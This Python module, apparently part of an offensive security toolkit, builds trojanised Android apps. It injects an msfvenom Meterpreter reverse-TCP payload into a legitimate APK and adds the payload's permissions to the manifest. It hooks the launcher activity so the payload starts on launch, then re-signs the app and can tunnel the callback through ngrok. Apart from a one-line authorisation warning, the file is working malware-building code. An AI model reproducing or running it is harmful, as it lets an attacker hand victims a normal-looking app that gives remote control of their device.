"""
APK Binder — injects a Metasploit payload into a legitimate APK for
authorised social-engineering / phishing-simulation assessments.
Requires: apktool, msfvenom, keytool, jarsigner (or apksigner), aapt.
"""

import os
import shutil
import re
from pathlib import Path
from typing import Optional
from rich.console import Console
from rich.prompt import Prompt, IntPrompt, Confirm
from core.utils import (
    require_tools, get_local_ip, find_free_port,
    PAYLOADS_DIR, CERTS_DIR, run_cmd, log_event, random_str, sha256_file
)

console = Console()

REQUIRED_TOOLS = ["apktool", "msfvenom", "keytool", "jarsigner", "aapt"]


def _decompile(apk: Path, out_dir: Path) -> bool:
    console.print(f"[cyan]► Decompiling[/] {apk.name}")
    rc, _, err = run_cmd(f'apktool d "{apk}" -o "{out_dir}" -f', timeout=180)
    if rc != 0:
        console.print(f"[red]✘ apktool decompile failed:[/] {err[:300]}")
        return False
    return True


def _generate_payload_apk(lhost: str, lport: int, tmp_dir: Path) -> Optional[Path]:
    payload_apk = tmp_dir / "payload.apk"
    console.print("[cyan]► Generating msfvenom payload APK...[/]")
    cmd = (
        f"msfvenom -p android/meterpreter/reverse_tcp "
        f"LHOST={lhost} LPORT={lport} -f apk -o \"{payload_apk}\""
    )
    rc, _, err = run_cmd(cmd, timeout=300)
    if rc != 0 or not payload_apk.exists():
        console.print(f"[red]✘ msfvenom failed:[/] {err[:300]}")
        return None
    return payload_apk


def _decompile_payload(payload_apk: Path, out_dir: Path) -> bool:
    console.print("[cyan]► Decompiling payload APK...[/]")
    rc, _, err = run_cmd(f'apktool d "{payload_apk}" -o "{out_dir}" -f', timeout=180)
    if rc != 0:
        console.print(f"[red]✘ apktool decompile payload failed:[/] {err[:300]}")
        return False
    return True


def _inject_smali(host_dir: Path, payload_dir: Path) -> bool:
    """Copy payload smali classes into the host APK smali folder."""
    console.print("[cyan]► Injecting payload smali classes...[/]")

    payload_smali = payload_dir / "smali"
    host_smali    = host_dir    / "smali"

    if not payload_smali.exists():
        console.print("[red]✘ Payload smali directory not found.[/]")
        return False

    for item in payload_smali.iterdir():
        dest = host_smali / item.name
        if item.is_dir():
            if dest.exists():
                shutil.copytree(str(item), str(dest), dirs_exist_ok=True)
            else:
                shutil.copytree(str(item), str(dest))
        else:
            shutil.copy2(str(item), str(dest))

    return True


def _find_launcher_activity(host_dir: Path) -> Optional[str]:
    """Find the main launcher activity class name from AndroidManifest.xml."""
    manifest = host_dir / "AndroidManifest.xml"
    if not manifest.exists():
        return None
    content = manifest.read_text(errors="ignore")

    pattern = r'android:name="([^"]+)"[^>]*>(?:[^<]*<[^>]*>)*[^<]*<action android:name="android\.intent\.action\.MAIN"'
    match = re.search(pattern, content)
    if not match:
        pattern2 = r'<activity[^>]+android:name="([^"]+)"'
        matches = re.findall(pattern2, content)
        if matches:
            return matches[0]
        return None
    return match.group(1)


def _patch_manifest(host_dir: Path, payload_dir: Path) -> bool:
    """Merge required permissions from payload manifest into host manifest."""
    console.print("[cyan]► Merging manifest permissions...[/]")

    host_manifest    = host_dir    / "AndroidManifest.xml"
    payload_manifest = payload_dir / "AndroidManifest.xml"

    if not host_manifest.exists() or not payload_manifest.exists():
        return False

    payload_content = payload_manifest.read_text(errors="ignore")
    host_content    = host_manifest.read_text(errors="ignore")

    perm_pattern = r'<uses-permission[^/]*/>'
    payload_perms = set(re.findall(perm_pattern, payload_content))
    host_perms    = set(re.findall(perm_pattern, host_content))
    new_perms     = payload_perms - host_perms

    if new_perms:
        insert_before = "<application"
        perms_block   = "\n    ".join(new_perms)
        host_content  = host_content.replace(
            insert_before,
            f"    {perms_block}\n    {insert_before}"
        )
        host_manifest.write_text(host_content)
        console.print(f"[green]  + Added {len(new_perms)} missing permissions[/]")

    return True


def _inject_hook_into_activity(host_dir: Path, activity_class: str) -> bool:
    """
    Patch the launcher Activity's onCreate to also launch the payload service.
    Finds the smali file and appends an invoke-static call.
    """
    console.print(f"[cyan]► Hooking launcher activity:[/] {activity_class}")

    smali_rel = activity_class.replace(".", "/").lstrip("/") + ".smali"
    if smali_rel.startswith("/"):
        smali_rel = smali_rel[1:]

    smali_path = host_dir / "smali" / smali_rel
    if not smali_path.exists():
        smali_paths = list((host_dir / "smali").rglob(Path(smali_rel).name))
        if not smali_paths:
            console.print(f"[yellow]⚠ Could not find smali for {activity_class}, skipping hook.[/]")
            return True
        smali_path = smali_paths[0]

    content = smali_path.read_text(errors="ignore")

    hook = (
        "\n    invoke-static {}, "
        "Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V\n"
    )

    if "Lcom/metasploit/stage/Payload;" in content:
        console.print("[dim]  Payload hook already present.[/]")
        return True

    # insert after first .method public onCreate
    target = "invoke-super"
    idx = content.find(target)
    if idx == -1:
        console.print("[yellow]⚠ Could not find injection point in smali.[/]")
        return True

    end_of_line = content.find("\n", idx)
    content = content[:end_of_line + 1] + hook + content[end_of_line + 1:]
    smali_path.write_text(content)
    return True


def _recompile(host_dir: Path, out_apk: Path) -> bool:
    console.print("[cyan]► Recompiling APK...[/]")
    rc, _, err = run_cmd(f'apktool b "{host_dir}" -o "{out_apk}"', timeout=300)
    if rc != 0:
        console.print(f"[red]✘ apktool build failed:[/] {err[:300]}")
        return False
    return True


def _sign_apk(apk: Path) -> Optional[Path]:
    console.print("[cyan]► Signing APK...[/]")
    keystore = CERTS_DIR / "debug.keystore"
    signed   = apk.with_stem(apk.stem + "_signed")

    if not keystore.exists():
        console.print("[yellow]  Generating debug keystore...[/]")
        cmd = (
            f'keytool -genkey -v -keystore "{keystore}" '
            f'-alias androiddebugkey -keyalg RSA -keysize 2048 '
            f'-validity 10000 -storepass android -keypass android '
            f'-dname "CN=Android Debug,O=Android,C=US" -noprompt'
        )
        rc, _, err = run_cmd(cmd, timeout=60)
        if rc != 0:
            console.print(f"[red]✘ keytool failed:[/] {err[:200]}")
            return None

    cmd = (
        f'jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 '
        f'-keystore "{keystore}" -storepass android -keypass android '
        f'-signedjar "{signed}" "{apk}" androiddebugkey'
    )
    rc, _, err = run_cmd(cmd, timeout=120)
    if rc != 0:
        console.print(f"[red]✘ jarsigner failed:[/] {err[:200]}")
        return None

    console.print(f"[green]✔ Signed APK:[/] {signed}")
    return signed


def bind_apk(
    source_apk: Path,
    lhost: str,
    lport: int,
    output_name: Optional[str] = None,
) -> Optional[Path]:
    """Full APK bind pipeline — decompile → inject → recompile → sign."""

    if not require_tools(REQUIRED_TOOLS):
        return None

    tmp_base    = PAYLOADS_DIR / f"bind_{random_str()}"
    host_dir    = tmp_base / "host"
    payload_dir = tmp_base / "payload_smali"
    tmp_apk     = tmp_base / "bound.apk"
    out_name    = output_name or f"bound_{source_apk.stem}_{random_str(4)}.apk"
    final_path  = PAYLOADS_DIR / out_name

    tmp_base.mkdir(parents=True, exist_ok=True)

    try:
        if not _decompile(source_apk, host_dir):
            return None

        payload_apk = _generate_payload_apk(lhost, lport, tmp_base)
        if not payload_apk:
            return None

        if not _decompile_payload(payload_apk, payload_dir):
            return None

        if not _inject_smali(host_dir, payload_dir):
            return None

        if not _patch_manifest(host_dir, payload_dir):
            return None

        activity = _find_launcher_activity(host_dir)
        if activity:
            _inject_hook_into_activity(host_dir, activity)
        else:
            console.print("[yellow]⚠ Launcher activity not found — skipping smali hook.[/]")

        if not _recompile(host_dir, tmp_apk):
            return None

        signed = _sign_apk(tmp_apk)
        if not signed:
            return None

        shutil.copy2(str(signed), str(final_path))
        console.print(f"\n[bold green]✔ Bound APK ready:[/] {final_path}")
        console.print(f"[dim]  SHA-256: {sha256_file(str(final_path))}[/]")
        log_event(f"APK bound: {final_path} | src={source_apk} | LHOST={lhost} LPORT={lport}")
        return final_path

    finally:
        shutil.rmtree(str(tmp_base), ignore_errors=True)


def interactive_bind():
    console.rule("[bold red]APK Binder[/]")
    console.print("[yellow]⚠  Use only on APKs you own or have written authorisation to test.[/]\n")

    src = Prompt.ask("Path to target APK")
    src_path = Path(src.strip('"').strip("'"))
    if not src_path.exists():
        console.print("[red]✘ File not found.[/]")
        return

    local_ip = get_local_ip()
    lhost    = Prompt.ask("LHOST", default=local_ip)
    lport    = IntPrompt.ask("LPORT", default=find_free_port(4444))

    use_ngrok = Confirm.ask("Use ngrok for LHOST?", default=False)
    if use_ngrok:
        from core.ngrok_handler import start_ngrok_tcp
        tunnel = start_ngrok_tcp(lport)
        if tunnel:
            lhost, lport = tunnel["host"], tunnel["port"]
            console.print(f"[green]✔ ngrok:[/] {lhost}:{lport}")

    out_name = Prompt.ask("Output filename (blank = auto)", default="")

    result = bind_apk(src_path, lhost, lport, out_name or None)
    if result:
        from core.utils import sha256_file
        console.print(f"\n[bold]Output:[/] {result}")
